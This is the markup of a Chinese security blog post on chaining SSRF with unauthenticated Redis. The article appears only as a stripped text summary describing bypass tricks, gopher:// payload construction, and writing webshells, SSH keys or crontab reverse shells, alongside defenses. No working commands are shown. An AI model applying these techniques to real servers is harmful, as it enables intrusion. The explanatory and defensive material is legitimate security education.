<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SSRF-Redis专题 | 高木のBlog</title><meta name="keywords" content="漏洞复现,中间件,网络安全,渗透测试,RCE"><meta name="author" content="Takake"><meta name="copyright" content="Takake"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SSRF-Redis专题"><meta name="application-name" content="SSRF-Redis专题"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SSRF-Redis专题"><meta property="og:url" content="https://blog.takake.com/posts/56723/index.html"><meta property="og:site_name" content="高木のBlog"><meta property="og:description" content="SSRF漏洞详解以下是关于 SSRF（Server-Side Request Forgery，服务端请求伪造） 漏洞的详细解析，涵盖原理、危害、利用场景、防御方法等内容。  一、SSRF 漏洞基础概念定义：SSRF 是一种攻击者通过构造恶意请求，诱导服务器端发起非预期的网络请求的漏洞。攻击目标通常是"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://blog.takake.com/img/default_cover.jpg"><meta property="article:author" content="Takake"><meta property="article:tag" content="技术,OpenAI,网络安全,hacker,ChatGPT,人工智能,WEB渗透测试,黑客,分享,服务器,WEB安全,红队,蓝队,"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.takake.com/img/default_cover.jpg"><meta name="description" content="SSRF漏洞详解以下是关于 SSRF（Server-Side Request Forgery，服务端请求伪造） 漏洞的详细解析，涵盖原理、危害、利用场景、防御方法等内容。  一、SSRF 漏洞基础概念定义：SSRF 是一种攻击者通过构造恶意请求，诱导服务器端发起非预期的网络请求的漏洞。攻击目标通常是"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://blog.takake.com/posts/56723/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/css/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"GPT-4.0-turbo","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3GpafT7n8yHKUbXT","LingQueMonitorID":"3GpatLJgdLFKhspS"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: 'https://takake.netlify.app/.netlify/functions/twikoo',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":null,"api":null,"cover_change":true},
  authorStatus: {"skills":["🤖️ 人工智能爱好者","🔍 分享与热心帮助","🔨 删库跑路一条龙","🤝 网络安全从业者","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: {"appId":"6ECK9ICH9Y","apiKey":"4d7d6edad6ebd6c982ea423b6b573b1c","indexName":"my_hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Takake","link":"链接: ","source":"来源: 高木のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: true,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '高木のBlog',
  title: 'SSRF-Redis专题',
  postAI: 'SSRF可诱导服务器访问内网Redis（默认6379），利用未授权漏洞写入定时任务/SSH公钥。通过gopher://协议构造Redis RESP协议命令，URL编码后触发攻击。防御需禁用非常用协议、校验请求目标、Redis绑定127.0.0.1并设置密码。',
  pageFillDescription: 'SSRF漏洞详解, 一、SSRF 漏洞基础概念, 二、SSRF 攻击原理, 三、SSRF 的危害场景, 四、SSRF 漏洞利用方式, 1. 基础利用示例, 2. 高级利用技巧ByPass, 1.进制编码绕过, 2.本地回环简写绕过, 3.域名泛解析绕过, 4.利用句号代替.绕过, 5.短链接绕过, 6.注释绕过x2F路由绕过, 7.利用封闭的字母数字绕过, 8.[]利用ipv6解析绕过, 9.CRLF编码转换绕过, 10.域名指向绕过, 11.重定向绕过, 五、攻击步骤, 六、SSRF 漏洞防御方案, 1. 输入校验与过滤, 2. 网络隔离与权限控制, 3. 安全编码实践, 4. 云环境防护, 5. 监控与日志, 七、经典案例, 八、工具与检测, 九、总结, Redis 未授权访问漏洞详解, 1. 漏洞背景, 2. 漏洞原理, 3. 影响版本, 4. 漏洞利用条件, 5. 漏洞复现, 环境搭建, 写入 WebShell, 写入 SSH 公钥, 写入定时任务, 可能会出现各种问题：, 6. 修复建议, 7. 总结, SSRF结合Redis利用, 1. 漏洞探测阶段, 1.1 确认SSRF漏洞存在, 1.2 探测内网Redis服务, 2. 利用Redis未授权漏洞, 2.1 PHP 内置 Gopher 协议支持的版本差异, 攻击代码的版本兼容性, 2.2 利用Gopher协议构造Redis命令, 2.3 生成Redis协议Payload, 2.4 redis命令格式, 2.5 通过SSRF发送Payload, 3. 获取权限, 3.1 SSH登录, 3.2 其他利用方式, 4. 横向移动, 防御建议漏洞详解以下是关于服务端请求伪造漏洞的详细解析涵盖原理危害利用场景防御方法等内容一漏洞基础概念定义是一种攻击者通过构造恶意请求诱导服务器端发起非预期的网络请求的漏洞攻击目标通常是服务器本身或内网资源利用服务器作为代理访问受限资源核心问题服务器未对用户输入的或参数进行严格校验直接用于发起网络请求如协议等二攻击原理攻击流程攻击者构造恶意请求服务器接收请求服务器发起非预期请求访问敏感资源或服务常见触发点用户输入参数如图片下载网页抓取调用服务器功能依赖外部资源如授权解析云服务元数据接口如的三的危害场景访问内网服务扫描内网端口和服务如等未授权服务攻击本地服务如读取敏感文件利用协议读取服务器本地文件如攻击云元数据获取云服务器临时凭证如的角色密钥协议滥用使用等协议与内网服务交互如未授权执行命令反射型攻击将服务器作为跳板发起或钓鱼攻击四漏洞利用方式基础利用示例服务器访问可能触发攻击者控制的逻辑协议利用使用等协议需要高级利用技巧进制编码绕过利用工具生成多种进制地址使用方式每一个都可以进行尝试本地回环简写绕过域名泛解析绕过例如当存在域名泛解析的配置当我们直接请求这个地址被过滤那我们可以使用泛域名解析任意前缀这样就会执行到利用句号代替绕过短链接绕过利用短链接生成网站生成短链接其实本质就是域名地址重定向将生成的短链接地址指向我们想要访问的地址注释绕过路由绕过可用于白名单绕过利用封闭的字母数字绕过利用解析绕过编码转换绕过在请求数据包阶段可用域名指向绕过域名指向本地回环地址当服务端解析了这个域名后请求的是本地回环地址重定向绕过这样实际上请求的就是这个端口利用条件是当且仅当第一段没有后面的链接例如是无法从定向的实际还是请求的是的服务后面是五攻击步骤验证是否能狗对外发起指定请求利用验证验证当前支持哪些协议验证是否支持回环地址内网段探测探测具体服务例如或者发起恶意攻击六漏洞防御方案输入校验与过滤白名单校验限制允许的协议仅和域名禁用危险协议禁止等协议正则匹配检查是否包含内网如网络隔离与权限控制服务器网络隔离禁止服务器访问非必要的内网服务最小化权限运行服务的进程使用低权限用户限制文件读取能力安全编码实践避免直接使用用户输入使用中间代理或缓存服务器处理外部资源使用安全库如的库代替避免自动处理协议云环境防护限制元数据接口访问通过云安全组或策略限制对元数据接口的访问使用临时凭证避免在元数据中存储长期有效的密钥监控与日志记录异常请求监控服务器发起的非预期请求如访问或云元数据部署使用应用防火墙拦截攻击特征七经典案例未授权访问利用协议发送命令写入定时任务反弹防御禁用非协议限制绑定图片抓取通过媒体上传功能触发访问内网服务防御校验图片白名单通过外部实体注入触发读取服务器文件防御禁用外部实体解析八工具与检测测试工具检测自动化漏洞利用工具在线检测请求测试云元数据暴露使用平台观察服务器是否发起查询九总结是服务器安全的高危漏洞可穿透内网边界结合其他服务如云元数据造成严重危害防御核心在于严格校验输入限制网络权限最小化服务暴露开发中需始终遵循不信任用户输入原则结合安全配置和监控降低风险未授权访问漏洞详解是数据库中的一个严重未授权访问漏洞攻击者可以通过未授权访问服务利用的文件写入功能实现远程代码执行或获取服务器权限以下是该漏洞的详细解析包括漏洞原理利用条件影响版本及复现步骤漏洞背景是一个开源的高性能键值存储数据库广泛应用于缓存消息队列等场景由于默认配置下未启用身份验证攻击者可以直接连接到服务并执行任意操作导致未授权访问漏洞的产生漏洞原理漏洞的核心在于的未授权访问和文件写入功能未授权访问默认绑定在且未启用密码认证导致攻击者可以直接连接并操作数据库文件写入功能提供了和命令允许用户设置数据库文件的存储路径和文件名攻击者可以通过这些命令将恶意数据写入目标服务器的文件系统例如写入公钥或定时任务从而实现远程代码执行或提权利用方式写入将恶意代码写入目录通过访问执行命令写入公钥将攻击者的公钥写入目标服务器的文件实现免密登录写入定时任务将恶意命令写入定时任务文件实现命令执行影响版本受影响版本修复版本及以上版本已修复该漏洞漏洞利用条件目标系统运行受影响版本的服务未启用密码认证绑定在或暴露在公网攻击者权限攻击者能够访问目标服务的端口默认文件写入条件写入需要知道目录路径并具有写权限写入公钥需要以权限运行且目标服务器允许密钥登录写入定时任务需要以权限运行且目标系统支持定时任务执行漏洞复现以下是漏洞复现的简要步骤环境搭建使用或虚拟机搭建环境如确保未启用密码认证并绑定在写入使用客户端连接目标服务目标设置目录和文件名写入恶意代码访问在浏览器中访问目标查看是否成功写入写入公钥在攻击机上生成密钥将公钥写入目标设置文件路径使用登录目标服务器目标写入定时任务设置定时任务目录写入反弹命令攻击机在攻击机上监听端口等待定时任务执行获取反弹可能会出现各种问题各个版本的发行版或者新旧版本定时任务目录不同写入的文件没有执行权限或者目录没有写入权限或者目标服务器根本没有使用过公私钥方式进行登陆因此不存在文件夹写文件时还得尽量保证的键值对清空否则写入执行不了或者链接不上不支持字符仅支持绝对路径而目录大概率权限又不够因此不知道用户名的情况下很难写入公钥文件反正就是成功率很低修复建议启用密码认证在中设置参数启用密码认证绑定修改中的参数限制仅监听本地或可信禁用高危命令使用禁用等危险命令防火墙策略使用防火墙限制端口的访问范围仅允许可信访问总结是一个高危的未授权访问漏洞影响范围广泛利用条件简单建议用户尽快启用密码认证限制访问权限并升级到最新版本以避免潜在的安全风险通过禁用不必要的功能和实施安全策略可以有效降低漏洞被利用的风险说实话不好成功唯一还算可以成功的的就是写只让访问使用协议进行文件写入实现远程结合利用利用服务器端请求伪造结合未授权漏洞进行内网渗透的攻击流程可分为以下几个阶段漏洞探测阶段确认漏洞存在目标场景找到存在漏洞的功能点如参数文件解析回调等验证方法若服务器请求了攻击者控制的地址则存在探测内网服务目标通过扫描内网和端口寻找开放的服务默认端口示例基于协议若返回版本信息如则存在未授权访问利用未授权漏洞内置协议支持的版本差异原生支持协议处理器如移除了协议支持直接使用会报错但通过手动构造请求仍有效版本影响点解决方案禁用内置协议使用手动构造请求更严格的错误处理机制确保命令格式完全符合协议全版本限制检查是否禁用网络相关函数攻击代码的版本兼容性以下代码在所有版本中均可运行需未被禁用连接失败示例发送命令利用协议构造命令使用自定义二进制协议需通过支持原始的协议如发送命令协议格式目标端口经过编码的命令关键步骤构造命令示例写入公钥将命令转换为协议格式编码后通过发送生成协议以写入公钥为例生成公钥公钥保存到文件构造命令转换为协议格式使用脚本或工具如或手动构造每行命令格式参数个数长度命令将生成的二进制协议数据通过发送命令格式的命令接受是通过请求发送二进制数据实现的命令注入因此发送的二进制数据需要符合格式具体格式如下号表示当前命令的开头后的数字表示该行命令的字符串个数即该行命令为只有一个字符串而表示该行命令有个字符串即而表示后面后一串命令字符串且字符长度为即表示个字符的命令关键字为同时每个字符串包括标识符或者都使用进行分割即是不可见字符只是转义的表示不可直接将进行编码获得而是直接将字符编码为即可知道了具体格式那么我们就可以手撸了例如只传输一个指令再将和进行编码其中是协议的发送二进制数据的标识起始位或者利用代码生成使用作为分隔符处理特殊字符保留原始不转义直接保留转换为字节并编码修正后的通过发送示例编码后的链接通过触发获取权限登录若写入公钥成功直接通过连接其他利用方式写入定时任务主从复制攻击横向移动信息收集获取内网拓扑其他服务凭证利用作为跳板通过已控制的服务器进一步渗透内网防御建议修复禁止非预期的协议如校验请求目标是否为合法地址加固绑定为设置强密码认证启用网络隔离限制内网服务的访问权限注意事项协议可能被现代框架禁用的目录权限需允许写入如需存在不同操作系统和版本可能影响利用成功率',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-05-22 20:29:38',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 8 || hour >= 22
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">高木のBlog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "10",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="红十字会" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" alt="LOGO" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp"/></a><div class="post-qr-code-desc">LOGO</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 1.05rem;">Chrome<sup>2</sup></a><a href="/tags/Fastjson/" style="font-size: 1.05rem;">Fastjson<sup>1</sup></a><a href="/tags/IPV6/" style="font-size: 1.05rem;">IPV6<sup>1</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>3</sup></a><a href="/tags/JAVA%E9%AB%98%E7%BA%A7/" style="font-size: 1.05rem;">JAVA高级<sup>1</sup></a><a href="/tags/JSON%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">JSON注入<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 1.05rem;">NAS<sup>3</sup></a><a href="/tags/NTLM/" style="font-size: 1.05rem;">NTLM<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>18</sup></a><a href="/tags/cisp/" style="font-size: 1.05rem;">cisp<sup>2</sup></a><a href="/tags/esxi/" style="font-size: 1.05rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>1</sup></a><a href="/tags/kerberos/" style="font-size: 1.05rem;">kerberos<sup>1</sup></a><a href="/tags/nas/" style="font-size: 1.05rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.05rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 1.05rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>15</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">博客<sup>1</sup></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">反序列化<sup>4</sup></a><a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">域渗透测试<sup>2</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.05rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.05rem;">密码<sup>8</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">开发<sup>4</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 1.05rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 1.05rem;">横向移动<sup>3</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 1.05rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 1.05rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" style="font-size: 1.05rem;">认证机制<sup>3</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.05rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
